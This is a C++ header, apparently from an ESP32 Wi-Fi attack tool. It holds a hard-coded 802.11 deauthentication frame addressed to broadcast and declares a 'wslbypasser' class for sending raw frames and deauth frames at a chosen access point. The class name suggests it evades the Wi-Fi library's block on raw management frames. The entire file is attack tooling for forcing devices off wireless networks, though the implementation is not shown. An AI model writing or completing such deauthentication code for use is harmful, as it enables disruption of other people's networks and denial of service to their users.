#pragma once

#include "esp_wifi_types.h"
#include <Arduino.h>

static const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

class wslbypasser
{
public:
    void send_raw_frame(const uint8_t *frame_buffer, int size);
    void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record);
};
